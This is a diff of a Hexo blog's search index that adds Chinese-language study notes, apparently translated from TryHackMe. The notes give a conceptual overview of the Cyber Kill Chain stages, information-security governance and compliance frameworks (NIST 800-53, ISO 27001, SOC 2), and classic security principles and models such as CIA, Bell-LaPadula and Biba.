@@ -1,42 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>网站模板</title>
-    <url>/2024/10/27/#%E7%BD%91%E7%AB%99%E6%A8%A1%E6%9D%BF/</url>
-    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><br>
-
-
-<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><br>
-
-
-<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><br>
-
-
-<!-- 成功使用✔? ✖? -->]]></content>
-      <categories>
-        <category>模板</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>安全原则</title>
-    <url>/2024/10/27/T1-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%802/</url>
-    <content><![CDATA[<h2 id="主题1"><a href="#主题1" class="headerlink" title="主题1"></a>主题1</h2><h3 id="副主题1"><a href="#副主题1" class="headerlink" title="副主题1"></a>副主题1</h3><h3 id="副主题2"><a href="#副主题2" class="headerlink" title="副主题2"></a>副主题2</h3><br>
-
-
-
-
-
-<h2 id="主题2"><a href="#主题2" class="headerlink" title="主题2"></a>主题2</h2><h3 id="副主题1-1"><a href="#副主题1-1" class="headerlink" title="副主题1"></a>副主题1</h3><h3 id="副主题2-1"><a href="#副主题2-1" class="headerlink" title="副主题2"></a>副主题2</h3><br>
-
-
-<!-- 网站地址 -->
-<!-- AI翻译✔? ✖?，手工检查✔? ✖?，AI优化✔? ✖?，通读原文✔? ✖? -->
-<!-- 删除例子✔? ✖?，删除主语✔? ✖?，母语化✔? ✖?，添加工具✔? ✖? -->]]></content>
-      <categories>
-        <category>网络安全基础</category>
-      </categories>
-  </entry>
-  <entry>
     <title>工具模板</title>
     <url>/2024/10/27/#%E5%B7%A5%E5%85%B7%E6%A8%A1%E6%9D%BF/</url>
     <content><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><br>
@@ -57,22 +21,20 @@
       </categories>
   </entry>
   <entry>
-    <title>治理与监管</title>
-    <url>/2024/10/27/T1-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%803/</url>
-    <content><![CDATA[<h2 id="主题1"><a href="#主题1" class="headerlink" title="主题1"></a>主题1</h2><h3 id="副主题1"><a href="#副主题1" class="headerlink" title="副主题1"></a>副主题1</h3><h3 id="副主题2"><a href="#副主题2" class="headerlink" title="副主题2"></a>副主题2</h3><br>
+    <title>网站模板</title>
+    <url>/2024/10/27/#%E7%BD%91%E7%AB%99%E6%A8%A1%E6%9D%BF/</url>
+    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><br>
 
 
+<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><br>
 
 
+<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><br>
 
-<h2 id="主题2"><a href="#主题2" class="headerlink" title="主题2"></a>主题2</h2><h3 id="副主题1-1"><a href="#副主题1-1" class="headerlink" title="副主题1"></a>副主题1</h3><h3 id="副主题2-1"><a href="#副主题2-1" class="headerlink" title="副主题2"></a>副主题2</h3><br>
 
-
-<!-- 网站地址 -->
-<!-- AI翻译✔? ✖?，手工检查✔? ✖?，AI优化✔? ✖?，通读原文✔? ✖? -->
-<!-- 删除例子✔? ✖?，删除主语✔? ✖?，母语化✔? ✖?，添加工具✔? ✖? -->]]></content>
+<!-- 成功使用✔? ✖? -->]]></content>
       <categories>
-        <category>网络安全基础</category>
+        <category>模板</category>
       </categories>
   </entry>
   <entry>
@@ -98,39 +60,48 @@
   <entry>
     <title>网络攻击链</title>
     <url>/2024/10/27/T1-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%804/</url>
-    <content><![CDATA[<h2 id="主题1"><a href="#主题1" class="headerlink" title="主题1"></a>主题1</h2><h3 id="副主题1"><a href="#副主题1" class="headerlink" title="副主题1"></a>副主题1</h3><h3 id="副主题2"><a href="#副主题2" class="headerlink" title="副主题2"></a>副主题2</h3><br>
+    <content><![CDATA[<h2 id="侦察"><a href="#侦察" class="headerlink" title="侦察"></a>侦察</h2><p>侦察是攻击者在攻击前的计划阶段，目的是发现并收集关于目标系统和受害者的信息。它包括开放源情报（OSINT），这是攻击者实施后续攻击的第一步。通过收集公司和员工的所有公开信息，攻击者可以确定最佳的攻击目标。</p>
+<p>在侦察阶段，攻击者通常尚未明确具体的攻击目标，因此需要借助 OSINT 手段来获取信息。</p>
+<p><strong>电子邮件收集</strong>是侦察的重要组成部分，涉及从公开、付费或免费服务中获取电子邮件地址。攻击者利用收集的电子邮件发起网络钓鱼攻击。在侦察阶段，攻击者可以使用多种工具，包括：</p>
+<p><strong>theHarvester</strong>：收集电子邮件、姓名、子域名、IP地址和URL，利用多个公共数据源。<br><strong>Hunter.io</strong>：电子邮件搜索工具，用于获取与特定域名关联的联系信息。<br><strong>OSINT Framework</strong>：提供多种OSINT工具，分类方便使用。</p>
+<p>攻击者还会利用社交媒体网站收集受害者或目标公司的信息<br><br></p>
+<h2 id="武器化"><a href="#武器化" class="headerlink" title="武器化"></a>武器化</h2><p>在侦察阶段结束后，攻击者进入武器化阶段，将恶意软件和漏洞利用结合为一个可投递的负载。大多数攻击者使用自动化工具生成恶意软件，或通过暗网获取现成的恶意工具。高级持续性威胁（APT）或国家支持的攻击者则可编写定制的恶意软件，使其更难被检测。</p>
+<p><strong>恶意软件</strong>（Malware）：旨在破坏、干扰或未经授权访问计算机的程序。<br><strong>漏洞利用</strong>（Exploit）：利用应用或系统漏洞的代码。<br><strong>负载</strong>（Payload）：攻击者在系统中执行的恶意代码。</p>
+<p>在武器化阶段，攻击者会采取以下行动：</p>
+<p><strong>恶意文档</strong>：创建带有恶意宏或VBA脚本的受感染Microsoft Office文档。<br><strong>物理传播</strong>：将带有恶意负载的U盘散布在公共场所，以传播蠕虫病毒。<br><strong>命令与控制</strong>（C2）：配置C2技术，便于在受害者设备上执行指令或分发更多负载。<br><strong>后门植入</strong>：部署后门程序，以便持续访问受害系统。</p>
+<br>
 
 
 
 
 
-<h2 id="主题2"><a href="#主题2" class="headerlink" title="主题2"></a>主题2</h2><h3 id="副主题1-1"><a href="#副主题1-1" class="headerlink" title="副主题1"></a>副主题1</h3><h3 id="副主题2-1"><a href="#副主题2-1" class="headerlink" title="副主题2"></a>副主题2</h3><br>
-
-
-<!-- 网站地址 -->
-<!-- AI翻译✔? ✖?，手工检查✔? ✖?，AI优化✔? ✖?，通读原文✔? ✖? -->
-<!-- 删除例子✔? ✖?，删除主语✔? ✖?，母语化✔? ✖?，添加工具✔? ✖? -->
+<h2 id="投递"><a href="#投递" class="headerlink" title="投递"></a>投递</h2><p>投递阶段是攻击者选择传送恶意负载或恶意软件方式的阶段，旨在将恶意软件引入目标系统。</p>
+<p><strong>网络钓鱼邮件</strong>：在侦察并确定目标后，攻击者设计带有恶意负载的邮件，发送给特定个人或公司内部的多个员工。</p>
+<p><strong>分发带有恶意软件的 U 盘</strong>：攻击者可能在咖啡店、停车场等公共场所放置带有恶意软件的U盘，或通过更复杂的方式，比如印上公司标志并伪装成客户礼物，将U盘邮寄给目标公司。</p>
+<p><strong>水坑攻击</strong>：攻击者入侵目标群体常访问的网站，利用网站漏洞将其重定向至恶意网址。此类攻击称为“驱动式下载”，当受害者访问受感染网站时，恶意软件会被无意间下载至受害者设备上。<br><br></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>为了获得系统访问权限，攻击者会利用系统中的漏洞。在获取初始访问权限后，攻击者可能利用软件、系统或服务器的漏洞进行权限提升或横向移动。横向移动是指攻击者在网络内进一步扩展，以获取敏感数据的技术。</p>
+<p>攻击者可能在此阶段使用零日漏洞利用。零日漏洞指的是在现实环境中尚未被发现的漏洞，这些漏洞暴露了软件或硬件中的安全缺陷，往往在未被意识到之前已被恶意利用，且最初几乎无法检测。</p>
+<p>漏洞利用的常见方式：</p>
+<p>受害者通过打开电子邮件附件或点击恶意链接触发漏洞<br>使用零日漏洞利用进行攻击<br>利用软件、硬件，人类的弱点<br>触发服务器端的漏洞利用<br><br></p>
+<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>后门允许攻击者绕过安全措施并隐秘地访问系统。当攻击者获得系统访问权限后，为确保在连接中断、初始访问被清除或系统打补丁后仍可重新访问，攻击者会安装一个持久性后门。</p>
+<p>持久性实现方式：</p>
+<p><strong>安装 Web Shell</strong>：在 Web 服务器上安装 Web Shell，使攻击者能持续访问。由于 Web Shell 的简单性及文件格式，常被误认为正常文件而难以检测。</p>
+<p><strong>安装后门程序</strong>：直接在受害者机器上安装后门程序。</p>
+<p><strong>创建或修改 Windows 服务</strong>：攻击者可通过创建或修改 Windows 服务来定期执行恶意脚本或负载，使用工具修改服务配置，甚至伪装成合法的服务名称。</p>
+<p><strong>添加启动条目</strong>：在注册表的 “Run 键” 或启动文件夹中添加恶意负载，使其在用户每次登录时自动执行。启动文件夹有用户账户级和系统级，系统级的条目会在所有用户登录时执行。</p>
+<p>攻击者还可能使用 Timestomping 技术规避取证检测，通过修改文件的时间戳，使恶意软件伪装成合法程序的一部分。<br><br></p>
+<h2 id="指挥与控制"><a href="#指挥与控制" class="headerlink" title="指挥与控制"></a>指挥与控制</h2><p>在获得持久性并成功在受害者机器上执行恶意软件后，攻击者通过 C2（指挥与控制）通道远程控制受害设备。这种持续通信方式也称为 C&amp;C 或 C2 信标通信，指 C&amp;C 服务器与受感染主机上的恶意软件之间的定期通信。受感染主机会与C2服务器持续联系，这也是“信标”一词的来源。</p>
+<p>受感染设备会连接到攻击者的外部服务器，开启指挥与控制通道。一旦建立连接，攻击者便可以完全控制受害者的机器</p>
+<p>常见的现代 C2 通道：</p>
+<p><strong>HTTP（端口80）和 HTTPS（端口443）</strong>：通过混合恶意流量和正常流量，帮助攻击者绕过防火墙检测。<br><strong>域名系统</strong>（DNS）：受感染主机会不断向攻击者的 DNS 服务器发送 DNS 请求，这种 C2 方式称为 DNS 隧道。</p>
+<p>C2 基础设施的拥有者可以是攻击者本身，也可以是另一个受感染的主机。<br><br></p>
+<h2 id="达成目标（数据外泄）"><a href="#达成目标（数据外泄）" class="headerlink" title="达成目标（数据外泄）"></a>达成目标（数据外泄）</h2><p>在经过前六个攻击阶段后，攻击者最终进入达成目标阶段，实现最初的攻击意图。通过完全控制受害者系统，攻击者可以执行以下操作：</p>
+<p>收集用户凭证信息<br>提升权限<br>进行内部侦察<br>横向移动至其他系统<br>收集并外泄敏感数据<br>删除备份和卷影副本<br>覆盖或破坏数据<br><br></p>
+<!-- https://tryhackme.com/r/room/cyberkillchainzmt -->
+<!-- AI翻译✔，手工检查✔，AI优化✔，通读原文✔ -->
+<!-- 删除例子✔，删除主语✔，母语化✔，添加工具✔ -->
 
 ]]></content>
-      <categories>
-        <category>网络安全基础</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>网络安全职业</title>
-    <url>/2024/10/27/T1-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%801/</url>
-    <content><![CDATA[<h2 id="主题1"><a href="#主题1" class="headerlink" title="主题1"></a>主题1</h2><h3 id="副主题1"><a href="#副主题1" class="headerlink" title="副主题1"></a>副主题1</h3><h3 id="副主题2"><a href="#副主题2" class="headerlink" title="副主题2"></a>副主题2</h3><br>
-
-
-
-
-
-<h2 id="主题2"><a href="#主题2" class="headerlink" title="主题2"></a>主题2</h2><h3 id="副主题1-1"><a href="#副主题1-1" class="headerlink" title="副主题1"></a>副主题1</h3><h3 id="副主题2-1"><a href="#副主题2-1" class="headerlink" title="副主题2"></a>副主题2</h3><br>
-
-
-<!-- 网站地址 -->
-<!-- AI翻译✔? ✖?，手工检查✔? ✖?，AI优化✔? ✖?，通读原文✔? ✖? -->
-<!-- 删除例子✔? ✖?，删除主语✔? ✖?，母语化✔? ✖?，添加工具✔? ✖? -->]]></content>
       <categories>
         <category>网络安全基础</category>
       </categories>
@@ -287,6 +258,115 @@
       </categories>
   </entry>
   <entry>
+    <title>治理与监管</title>
+    <url>/2024/10/27/T1-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%803/</url>
+    <content><![CDATA[<h2 id="为什么重要？"><a href="#为什么重要？" class="headerlink" title="为什么重要？"></a>为什么重要？</h2><p><strong>治理</strong>：管理和引导组织或系统，以实现其目标并确保遵守法律、法规和标准。<br><strong>法规</strong>：由管理机构实施的规则或法律，旨在确保合规并防范风险和危害。<br><strong>合规</strong>：组织或系统遵循适用的法律、法规和标准的状态。</p>
+<h3 id="信息安全治理"><a href="#信息安全治理" class="headerlink" title="信息安全治理"></a>信息安全治理</h3><p>信息安全治理指的是组织为确保信息资产的机密性、完整性和可用性而建立的结构、政策、方法和指导方针。由高级管理层负责，包含以下流程：</p>
+<p><strong>战略</strong>：制定并实施与组织业务目标一致的全面信息安全战略。<br><strong>政策和程序</strong>：编制指导信息资产使用和保护的政策和程序。<br><strong>风险管理</strong>：进行风险评估，识别信息资产面临的威胁，并采取缓解措施。<br><strong>绩效衡量</strong>：设立关键绩效指标（KPI），衡量信息安全治理的效果。<br><strong>合规</strong>：确保符合相关法规和行业最佳实践。</p>
+<h3 id="信息安全法规"><a href="#信息安全法规" class="headerlink" title="信息安全法规"></a>信息安全法规</h3><p>信息安全法规是管理信息资产使用和保护的法律和监管框架，旨在防止敏感数据的未经授权访问、盗窃和滥用。合规通常是强制性的，由政府或监管机构监督执行。</p>
+<h3 id="主要优势"><a href="#主要优势" class="headerlink" title="主要优势"></a>主要优势</h3><p><strong>更强的安全防御</strong>：通过安全治理和法规遵从，降低安全风险，保护敏感信息免受攻击。<br><strong>增强利益相关者信任</strong>：展现组织的网络安全承诺，提升利益相关者的信任。<br><strong>法规合规</strong>：遵守法规，避免法律与经济处罚及声誉损失。<br><strong>与业务目标一致</strong>：帮助将信息安全策略与业务目标一致，确保安全措施具备成本效益。<br><strong>支持决策</strong>：提供信息安全风险的知识支持，确保安全措施部署在关键位置。<br><strong>竞争优势</strong>：展示组织对数据保护的承诺，增强信任并带来竞争优势。</p>
+<p>特定法律和法规构成安全治理和合规的基础，为组织提供统一的标准，减少不确定性，推动问责与创新的数据保护方法。<br><br></p>
+<h2 id="信息安全框架"><a href="#信息安全框架" class="headerlink" title="信息安全框架"></a>信息安全框架</h2><p>信息安全框架是一份全面的文档，概述了组织的信息安全方针，并规范了安全的实施、管理和执行方式，主要包括：</p>
+<p><strong>政策</strong>：明确组织的目标、原则以及达成特定目标的指导方针。<br><strong>标准</strong>：规定特定流程、产品或服务的要求或规范。<br><strong>指导方针</strong>：提供推荐措施和最佳实践。<br><strong>程序</strong>：列出完成特定任务或流程的具体步骤。<br><strong>基准</strong>：组织或系统必须满足的最低安全要求。</p>
+<h3 id="制定治理文档"><a href="#制定治理文档" class="headerlink" title="制定治理文档"></a>制定治理文档</h3><p><strong>确定范围和目的</strong>：明确文档的适用范围和必要性。<br><strong>研究和审查</strong>：研究相关法规、行业标准和最佳实践，审查现有政策和程序，确保内容全面并避免冲突。<br><strong>起草文档</strong>：制定清晰的大纲，起草内容，确保与组织目标和价值观一致。<br><strong>审查与批准</strong>：由主题专家、合规团队和管理层审阅，吸收反馈并获得最终批准。<br><strong>实施与沟通</strong>：向员工和利益相关方传达，提供培训以确保理解和遵守。<br><strong>审查和更新</strong>：定期审查和更新文档，根据反馈和威胁环境或法规变化进行调整。</p>
+<p>组织不必总是自行制定标准，可采用现有的行业标准。在选择标准时需考虑法规要求、地理区域、范围、目标和资源等因素。<br><br></p>
+<h2 id="治理、风险与合规（GRC）"><a href="#治理、风险与合规（GRC）" class="headerlink" title="治理、风险与合规（GRC）"></a>治理、风险与合规（GRC）</h2><p>信息安全治理和合规是维护组织整体安全的必要条件。GRC 框架通过集成的方式管理治理、风险管理和合规，确保组织在符合法规和行业标准的前提下运营，并实现其业务目标和愿景。GRC 框架包括以下三个核心组成部分：</p>
+<p>GRC的组成部分<br><strong>治理</strong>：通过信息安全战略为组织设定方向，建立监控方法来衡量绩效并评估结果。<br><strong>风险管理</strong>：识别、评估并优先处理组织面临的风险，实施控制和缓解策略，进行持续监控与报告，并优化风险管理流程以保持有效性。<br><strong>合规</strong>：确保组织符合法律、法规和行业要求，制定并实施合规计划，进行定期审计，向利益相关者报告合规情况。</p>
+<h3 id="如何制定-GRC-程序-通用指南"><a href="#如何制定-GRC-程序-通用指南" class="headerlink" title="如何制定 GRC 程序 - 通用指南"></a>如何制定 GRC 程序 - 通用指南</h3><p>一个完善的 GRC 程序提供风险管理、法规合规的综合框架，增强组织的整体安全视角，减轻网络事件影响，确保业务韧性。GRC程序的制定和实施包含以下步骤：</p>
+<p><strong>定义范围和目标</strong>：确定 GRC 程序的适用范围和目标。<br><strong>进行风险评估</strong>：识别并评估组织的网络风险，优先处理这些风险并制定风险管理策略。<br><strong>制定政策和程序</strong>：编写指导网络安全的政策和程序。<br><strong>建立治理流程</strong>：确保 GRC 程序通过治理流程得到有效管理，明确角色和职责。<br><strong>实施控制措施</strong>：执行技术和非技术控制措施，缓解识别的风险。<br><strong>监控和衡量绩效</strong>：建立流程，持续监控和评估 GRC 程序的有效性。<br><strong>持续改进</strong>：根据绩效指标、风险变化和反馈，持续改进 GRC 程序。<br><br></p>
+<h2 id="隐私与数据保护"><a href="#隐私与数据保护" class="headerlink" title="隐私与数据保护"></a>隐私与数据保护</h2><p>在金融、医疗、政府和工业等领域，隐私和数据保护法规至关重要，因为它们涉及到公民的个人可识别信息（PII）。隐私法规确保个人信息得到负责任且道德的处理和存储，帮助建立信任，保护个人隐私，并确保合规，体现了数据保护法规的重要性。<br><br></p>
+<h2 id="NIST-特别出版物"><a href="#NIST-特别出版物" class="headerlink" title="NIST 特别出版物"></a>NIST 特别出版物</h2><h3 id="NIST-800-53"><a href="#NIST-800-53" class="headerlink" title="NIST 800-53"></a>NIST 800-53</h3><p>NIST 800-53 是由美国国家标准与技术研究院（NIST）发布的《信息系统与组织的安全与隐私控制》指南，旨在保护信息系统的机密性、完整性和可用性。它提供了安全控制目录，帮助组织评估并增强信息系统的安全与隐私，支持其遵守相关法律和政策。NIST 800-53 整合了多种行业标准和国际框架中的最佳实践。</p>
+<h3 id="关键点"><a href="#关键点" class="headerlink" title="关键点"></a>关键点</h3><p>NIST 800-53 包含全面的安全和隐私控制集，用于保护组织的运营、资产和人员免受各种威胁，包括蓄意攻击、自然灾害和隐私风险。第五版将安全控制划分为 20 个控制族，每个控制族关注特定的安全领域。</p>
+<h3 id="如何基于-NIST-800-53-开发和实施信息安全计划"><a href="#如何基于-NIST-800-53-开发和实施信息安全计划" class="headerlink" title="如何基于 NIST 800-53 开发和实施信息安全计划"></a>如何基于 NIST 800-53 开发和实施信息安全计划</h3><p>在所有控制族中，计划管理是核心控制，要求组织建立并监控信息安全与隐私计划，以保护系统中处理、存储和传输的信息。为此，需执行以下步骤：</p>
+<p><strong>识别资产和威胁</strong>：全面识别数据资产、系统及其潜在威胁，包括数据流、系统依赖性及漏洞。<br><strong>映射控制</strong>：将 NIST 800-53 的控制族与已识别的资产和威胁匹配。<br><strong>建立治理结构</strong>：明确控制实施和维护的职责，确保过程结构化。<br><strong>监控与评估</strong>：定期监控和审查，建立问题识别和解决机制，实施常规评估和审计，以改进控制。</p>
+<p>通过这些步骤，组织可有效实施NIST 800-53框架，提高安全性并降低风险。</p>
+<h3 id="NIST-800-63B"><a href="#NIST-800-63B" class="headerlink" title="NIST 800-63B"></a>NIST 800-63B</h3><p>NIST 800-63B 是由 NIST 发布的数字身份管理指南，帮助组织建立有效的身份验证流程，确保对数字服务、系统和网络的访问安全。它提供了从基础到高级的身份保证建议，涵盖了密码、生物识别、令牌等身份认证因素的使用，确保用户凭据的安全管理和存储。<br><br></p>
+<h2 id="信息安全管理与合规"><a href="#信息安全管理与合规" class="headerlink" title="信息安全管理与合规"></a>信息安全管理与合规</h2><p>信息安全（IS）管理涵盖安全措施的战略规划、执行和持续管理，以保护信息资产免受未经授权的访问、使用、披露、篡改或破坏。IS 管理涉及风险评估、安全控制、事件响应规划和安全意识培训。合规则指遵守与信息安全相关的法律、法规、合同和行业标准。</p>
+<h3 id="ISO-IEC-27001"><a href="#ISO-IEC-27001" class="headerlink" title="ISO&#x2F;IEC 27001"></a>ISO&#x2F;IEC 27001</h3><p>ISO&#x2F;IEC 27001 是国际标准，规定了制定、实施和改进信息安全管理体系（ISMS）的要求，由 ISO 和 IEC 联合发布，包含以下核心要素：</p>
+<p><strong>范围</strong>：指定 ISMS 覆盖的资产和流程。<br><strong>信息安全政策</strong>：定义信息安全方法的高层文件。<br><strong>风险评估</strong>：识别影响机密性、完整性和可用性的风险。<br><strong>风险处理</strong>：通过控制措施将风险降至可接受水平。<br><strong>适用性声明</strong>（SoA）：说明适用的控制措施。<br><strong>内部审计</strong>：定期审查 ISMS 的有效性。<br><strong>管理评审</strong>：定期检查 ISMS 的绩效。</p>
+<p>ISO 27001 的优势<br>构建 ISMS 需全面评估安全流程、识别差距并进行深入的风险评估。在访问控制和事件响应等方面建立规则与流程，并与ISO 27001 要求相同。领导层支持和资源投入、定期监控和改进是确保 ISMS 有效性的关键。</p>
+<h3 id="服务组织控制2（SOC-2）"><a href="#服务组织控制2（SOC-2）" class="headerlink" title="服务组织控制2（SOC 2）"></a>服务组织控制2（SOC 2）</h3><p>SOC 2 由美国注册会计师协会（AICPA）开发，评估服务组织的数据安全性，专注于 CIA 三要素。SOC 2 对处理或存储敏感数据的服务提供商尤为重要，展示了组织对隐私和安全的承诺，通常作为客户选择的竞争优势。</p>
+<h3 id="重要原则"><a href="#重要原则" class="headerlink" title="重要原则"></a>重要原则</h3><p>SOC 2 是一个审计标准，用于评估服务组织在机密性、可用性、完整性和隐私方面的控制措施：</p>
+<p><strong>独立审计</strong>：由合格的审计员审查控制是否符合标准。<br><strong>SOC 2 报告</strong>：提供给客户和监管机构，证明服务组织已采取充分措施来保护客户数据。<br><strong>审计内容</strong>：包括物理安全、网络安全、加密、备份、恢复和员工安全培训。</p>
+<h3 id="计划并进行-SOC-2-审计"><a href="#计划并进行-SOC-2-审计" class="headerlink" title="计划并进行 SOC 2 审计"></a>计划并进行 SOC 2 审计</h3><p><strong>确定范围</strong>：包括特定的系统、流程或地点。<br><strong>选择审计员</strong>：选择具有SOC 2经验的合格审计员。<br><strong>计划审计</strong>：与审计员合作制定审计计划。<br><strong>准备审计</strong>：审查控制措施和程序，识别并补救差距。<br><strong>执行审计</strong>：审计员通过访谈、文档审查和控制测试评估有效性。<br><strong>接收报告</strong>：审计员提供报告，描述控制、缺陷和改进建议。</p>
+<p>SOC 2 审计检查的通用控制取决于审计范围，通常包括对数据处理、访问控制和系统安全性的全面评估。<br><br></p>
+<!-- https://tryhackme.com/r/room/cybergovernanceregulation -->
+<!-- AI翻译✔，手工检查✔，AI优化✔，通读原文✔ -->
+<!-- 删除例子✔，删除主语✔，母语化✔，添加工具✔ -->]]></content>
+      <categories>
+        <category>网络安全基础</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>安全原则</title>
+    <url>/2024/10/27/T1-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%802/</url>
+    <content><![CDATA[<h2 id="CIA"><a href="#CIA" class="headerlink" title="CIA"></a>CIA</h2><p>在评估系统安全性时，核心关注点为安全三元组：机密性（Confidentiality）、完整性（Integrity）和可用性（Availability），CIA 模型。</p>
+<p><strong>机密性</strong>：确保数据仅供授权的人员或接收方访问，防止未经授权的访问<br><strong>完整性</strong>：确保数据在存储或传输中不被篡改，且任何变动均可被检测到<br><strong>可用性</strong>：确保系统或服务在需求时可用，避免中断和故障</p>
+<h3 id="除了CIA"><a href="#除了CIA" class="headerlink" title="除了CIA"></a>除了CIA</h3><p><strong>真实性</strong>：确保数据确实来自宣称的来源，防止伪造或冒充<br><strong>不可否认性</strong>：信息的提供者无法否认自己是数据的来源</p>
+<h3 id="Parker-六要素"><a href="#Parker-六要素" class="headerlink" title="Parker 六要素"></a>Parker 六要素</h3><p>1998 年，Donn Parker 提出了扩展的六要素安全模型：</p>
+<p>可用性<br>实用性<br>完整性<br>真实性<br>机密性<br>占有性</p>
+<p><strong>实用性</strong>：确保信息具有足够的价值和适用性<br><strong>占有性</strong>：控制信息的所有权和获取权限，防止未经授权的复制或控制<br><br></p>
+<h2 id="DAD"><a href="#DAD" class="headerlink" title="DAD"></a>DAD</h2><p>系统的安全性可能面临以下主要攻击：机密数据的泄露、数据的篡改和数据的破坏。</p>
+<p><strong>泄露</strong>：即机密性的对立面，指未授权的访问导致机密数据泄露<br><strong>篡改</strong>：完整性的对立面，涉及未经授权的更改或修改数据<br><strong>破坏&#x2F;拒绝服务</strong>：可用性的对立面，指系统或服务因攻击而无法访问或被损坏</p>
+<p>定义了 CIA 三元组的反面，DAD 三元组：</p>
+<p>泄露（Disclosure）：攻击机密性<br>篡改（Alteration）：攻击完整性<br>破坏&#x2F;拒绝服务（Destruction）：攻击可用性</p>
+<p>有效的安全实施要求在机密性、完整性和可用性之间取得平衡。过度保护机密性和完整性可能会限制可用性，而优先提升可用性可能会牺牲机密性和完整性。</p>
+<br>
+
+
+
+
+
+<h2 id="安全模型的基本概念"><a href="#安全模型的基本概念" class="headerlink" title="安全模型的基本概念"></a>安全模型的基本概念</h2><p>要创建确保一种或多种安全功能的系统，可通过安全模型实现</p>
+<h3 id="Bell-LaPadula-模型"><a href="#Bell-LaPadula-模型" class="headerlink" title="Bell-LaPadula 模型"></a>Bell-LaPadula 模型</h3><p>Bell-LaPadula 模型专注于保护<strong>机密性</strong>，通过以下三条规则实现：</p>
+<p><strong>简单安全属性</strong>（No Read Up）：低安全级别的主体无法读取高安全级别的对象，防止低级别主体访问敏感信息<br><strong>星号安全属性</strong>（No Write Down）：高安全级别的主体不能向低安全级别的对象写入，以防止信息泄露到低级别主体<br><strong>自主安全属性</strong>：基于访问矩阵控制主体对对象的读写权限</p>
+<table>
+<thead>
+<tr>
+<th>主体</th>
+<th>对象A</th>
+<th>对象B</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>主体1</td>
+<td>写入</td>
+<td>无访问权限</td>
+</tr>
+<tr>
+<td>主体2</td>
+<td>读&#x2F;写</td>
+<td>读取</td>
+</tr>
+</tbody></table>
+<p>这些规则总结为“向上写入，向下读取”原则。即允许向更高安全级别的对象写入数据（向上写入），并从较低安全级别的对象读取数据（向下读取）。</p>
+<p>Bell-LaPadula 模型的局限性之一是它不适合处理文件共享等情境</p>
+<h3 id="Biba-模型"><a href="#Biba-模型" class="headerlink" title="Biba 模型"></a>Biba 模型</h3><p>Biba 模型专注于保护数据的<strong>完整性</strong>，通过以下两条规则实现：</p>
+<p><strong>简单完整性属性</strong>（No Read Down）：高完整性主体不能读取低完整性对象的数据，以避免数据受到不可信来源的影响。<br><strong>星号完整性属性</strong>（No Write Up）：低完整性主体不能向高完整性对象写入数据，以防止不可信数据污染高完整性数据。</p>
+<p>这两条规则总结为“向上读取，向下写入”。与 Bell-LaPadula 模型专注于机密性不同，Biba 模型专注于完整性。</p>
+<p>Biba 模型的一个局限性是它在应对内部威胁方面效果有限。</p>
+<h3 id="Clark-Wilson-模型"><a href="#Clark-Wilson-模型" class="headerlink" title="Clark-Wilson 模型"></a>Clark-Wilson 模型</h3><p>Clark-Wilson 模型通过以下概念来实现数据<strong>完整性</strong>：</p>
+<p><strong>约束数据项</strong>（CDI）：指需要保持完整性的数据<br><strong>非约束数据项</strong>（UDI）：指不涉及完整性的其他数据<br><strong>转换过程</strong>（TPs）：用于维护 CDI 完整性的程序操作<br><strong>完整性验证过程</strong>（IVPs）：用于检查和确保 CDI 的完整性有效性</p>
+<p>Clark-Wilson 模型通过这些机制来确保关键数据的可靠性和准确性</p>
+<p>其他安全模型：</p>
+<p>Brewer and Nash 模型<br>Goguen-Meseguer 模型<br>Sutherland 模型<br>Graham-Denning 模型<br>Harrison-Ruzzo-Ullman 模型<br><br></p>
+<h2 id="纵深防御"><a href="#纵深防御" class="headerlink" title="纵深防御"></a>纵深防御</h2><p>纵深防御是指构建一个多层次的安全系统，也被称为多层安全（Multi-Level Security）<br><br></p>
+<h2 id="ISO-IEC-19249"><a href="#ISO-IEC-19249" class="headerlink" title="ISO&#x2F;IEC 19249"></a>ISO&#x2F;IEC 19249</h2><p>国际标准化组织（ISO）和国际电工委员会（IEC）发布了 ISO&#x2F;IEC 19249:2017《信息技术 - 安全技术 - 安全产品、系统和应用的架构与设计原则目录》。该标准旨在为安全架构和设计提供指导，帮助理解国际组织对安全原则的建议</p>
+<h3 id="ISO-IEC-19249-列出了五项架构原则："><a href="#ISO-IEC-19249-列出了五项架构原则：" class="headerlink" title="ISO&#x2F;IEC 19249 列出了五项架构原则："></a>ISO&#x2F;IEC 19249 列出了五项架构原则：</h3><p><strong>域分离</strong>：将组件分组为独立的实体，每个实体包含应用程序、数据或其他资源，并分配特定的安全属性。<br><strong>分层</strong>：系统按多个抽象层次组织，可在不同层次上应用安全策略并验证系统状态，与纵深防御相关。<br><strong>封装</strong>：在面向对象编程（OOP）中，通过特定方法隐藏底层实现，防止直接访问对象数据。<br><strong>冗余</strong>：增加系统组件或功能的重复，以确保系统的高可用性和完整性。<br><strong>虚拟化</strong>：通过将硬件资源共享给多个操作系统，实现沙箱隔离，提供更强的安全边界，并支持安全执行和监控恶意程序。</p>
